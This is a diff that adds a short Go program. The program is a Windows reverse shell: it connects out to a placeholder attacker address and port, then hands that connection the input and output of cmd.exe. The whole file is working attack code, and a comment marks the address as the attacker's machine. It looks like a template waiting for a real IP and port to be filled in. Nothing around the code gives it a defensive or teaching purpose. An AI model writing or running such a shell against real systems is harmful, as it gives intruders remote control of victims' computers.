@@ -1,0 +1,25 @@
+package main
+
+import (
+	"net"
+	"os/exec"
+)
+
+func main() {
+	// Connect to the attacker's machine
+	conn, err := net.Dial("tcp", "__IPADDR__:__PORT__")
+	if err != nil {
+		return
+	}
+	defer conn.Close() // Ensure the connection is closed when done
+
+	// Create a new command to run CMD
+	cmd := exec.Command("cmd.exe")
+	cmd.Stdin = conn
+	cmd.Stdout = conn
+	cmd.Stderr = conn
+
+	// Run the shell
+	cmd.Run()
+}
+
